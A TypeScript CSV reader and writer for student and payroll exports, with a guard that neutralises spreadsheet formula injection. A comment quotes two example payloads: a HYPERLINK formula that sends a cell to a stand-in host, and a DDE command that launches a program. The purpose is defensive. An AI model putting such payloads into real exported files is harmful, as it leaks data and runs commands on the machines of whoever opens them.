/**
 * RFC 4180 CSV reading and writing. Pure: no database, no framework.
 *
 * Written for the student import in Phase 4 and moved here in Phase 8, when payroll
 * needed the same writer — CSV is a file format, not a rule about students.
 */

export const IMPORT_COLUMNS = [
  "full_name",
  "parent_phone",
  "class_name",
  "join_date",
  "student_phone",
  "parent_whatsapp",
  "national_id",
] as const;

export const REQUIRED_COLUMNS = ["full_name", "parent_phone", "class_name", "join_date"] as const;

export type ParsedRow = {
  /** 1-based, counting the header, so it matches what the user sees in a spreadsheet. */
  lineNumber: number;
  values: Record<string, string>;
};

/**
 * A small RFC-4180 reader: quoted fields, doubled quotes inside them, CRLF or LF.
 * Arabic names regularly contain commas in real exports, so quoting has to work.
 */
export function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let inQuotes = false;

  // Strip a UTF-8 BOM: Excel writes one, and it would corrupt the first header name.
  const input = text.replace(/^﻿/, "");

  for (let i = 0; i < input.length; i++) {
    const char = input[i];

    if (inQuotes) {
      if (char === '"') {
        if (input[i + 1] === '"') {
          field += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        field += char;
      }
      continue;
    }

    if (char === '"') {
      inQuotes = true;
    } else if (char === ",") {
      row.push(field);
      field = "";
    } else if (char === "\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
    } else if (char !== "\r") {
      field += char ?? "";
    }
  }

  if (field.length > 0 || row.length > 0) {
    row.push(field);
    rows.push(row);
  }

  return rows.filter((r) => r.some((cell) => cell.trim().length > 0));
}

export type HeaderResult = { ok: true; headers: string[] } | { ok: false; missing: string[] };

export function readHeaders(rows: string[][]): HeaderResult {
  const headers = (rows[0] ?? []).map((h) => h.trim().toLowerCase());
  const missing = REQUIRED_COLUMNS.filter((column) => !headers.includes(column));
  return missing.length > 0 ? { ok: false, missing } : { ok: true, headers };
}

export function toRows(rows: string[][], headers: string[]): ParsedRow[] {
  return rows.slice(1).map((cells, index) => {
    const values: Record<string, string> = {};
    headers.forEach((header, column) => {
      values[header] = (cells[column] ?? "").trim();
    });
    return { lineNumber: index + 2, values };
  });
}

/**
 * A cell Excel will read as text rather than as a formula
 * (docs/AUDIT-2026-09.md, finding 6).
 *
 * A student's name is free text typed at the desk, or imported from a CSV somebody was
 * sent. `=HYPERLINK("http://x/"&A1,"اضغط هنا")` in a name survives the round trip and
 * runs when the exported register is opened — by the centre's own staff, on the
 * centre's own machine, from a file this system produced. `@` and a leading `+` or `-`
 * do the same: `+cmd|' /C calc'!A0` is a formula, not a number.
 *
 * The one exception is a value that is a sign followed by digits, because a phone is
 * stored as `+201012345678` and that is arithmetic — no function, no DDE. Escaping it
 * would put a visible apostrophe in front of every phone number in the file, which is
 * a real cost for no gain.
 */
const ALWAYS_DANGEROUS = /^[=@\t\r]/;
/** A sign followed by nothing but digits and spaces: a number, however long. */
const PLAIN_NUMBER = /^[+-][\d\s]+$/;

function neutralizeFormula(text: string): string {
  if (ALWAYS_DANGEROUS.test(text)) return `'${text}`;
  if (/^[+-]/.test(text) && !PLAIN_NUMBER.test(text)) return `'${text}`;
  return text;
}

/** Quotes a field only when it needs it, so the common case stays readable. */
export function toCsvField(value: string | number | null | undefined): string {
  const text = neutralizeFormula(value === null || value === undefined ? "" : String(value));
  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

export function toCsv(headers: readonly string[], rows: readonly (string | number | null)[][]): string {
  const lines = [headers.map(toCsvField).join(",")];
  for (const row of rows) lines.push(row.map(toCsvField).join(","));
  // The BOM is what makes Excel open Arabic as UTF-8 instead of mojibake.
  return `${BOM}${lines.join("\r\n")}\r\n`;
}

const BOM = "﻿";

/**
 * Puts the BOM back if it did not survive the trip to the browser
 * (docs/AUDIT-2026-09.md, finding 13).
 *
 * `toCsv` writes one. A Next.js server action does not return it: the leading U+FEFF is
 * gone by the time the client has the string, so every exported register was opening in
 * Excel as mojibake — the exact thing the BOM was added to prevent. The unit test never
 * saw it, because it tests the function and the bug is in the wire.
 *
 * So the file is assembled where it is written, not where it is generated. Idempotent,
 * so it stays correct if the framework ever stops eating it.
 */
export function ensureBom(csv: string): string {
  return csv.startsWith(BOM) ? csv : `${BOM}${csv}`;
}
